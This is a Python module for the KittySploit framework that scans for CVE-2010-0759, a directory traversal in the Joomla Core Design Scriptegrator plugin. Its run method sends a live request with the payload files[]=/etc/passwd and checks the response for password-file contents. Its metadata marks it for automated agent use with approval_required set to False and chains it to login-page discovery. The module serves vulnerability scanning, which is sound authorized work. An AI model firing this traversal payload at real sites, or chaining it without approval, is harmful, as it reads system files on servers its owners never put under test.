#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""A directory traversal vulnerability in plugins/system/cdscriptegrator/libraries/highslide/js/jsloader."""

import re
from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Joomla! Plugin Core Design Scriptegrator - Local File Inclusion Detection',
        'description': 'A directory traversal vulnerability in plugins/system/cdscriptegrator/libraries/highslide/js/jsloader.php in the Core Design Scriptegrator plugin 1.4.1 for Joomla! allows remote attackers to read, and possibly include and execute, arbitrary files via directory traversal sequences in the files[] parameter.',
        'author': ['KittySploit Team'],
        'severity': 'high',
        'tags': ['web', 'scanner', 'cve', 'cve2010', 'joomla', 'lfi', 'plugin', 'edb', 'greatjoomla', 'vuln', 'vkev'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['auxiliary/scanner/http/login_page_detector'],
            },
        },
        'references': [
            'https://www.exploit-db.com/exploits/11498',
            'https://nvd.nist.gov/vuln/detail/CVE-2010-0759',
            'http://www.exploit-db.com/exploits/11498',
            'https://exchange.xforce.ibmcloud.com/vulnerabilities/56380',
            'https://github.com/ARPSyndicate/kenzer-templates',
        ],
        'cve': 'CVE-2010-0759',
    }

    def run(self):
        r = self.http_request(method="GET", path='/plugins/system/cdscriptegrator/libraries/highslide/js/jsloader.php?files[]=/etc/passwd', allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        body_regexes = ('root:.*:0:0:',)
        if (any(re.search(rx, body, 0) for rx in body_regexes)):
            self.set_info(
                severity='high',
                reason="Joomla! Plugin Core Design Scriptegrator - Local File Inclusion detected",
                path='/plugins/system/cdscriptegrator/libraries/highslide/js/jsloader.php?files[]=/etc/passwd',
            )
            return True
        return False

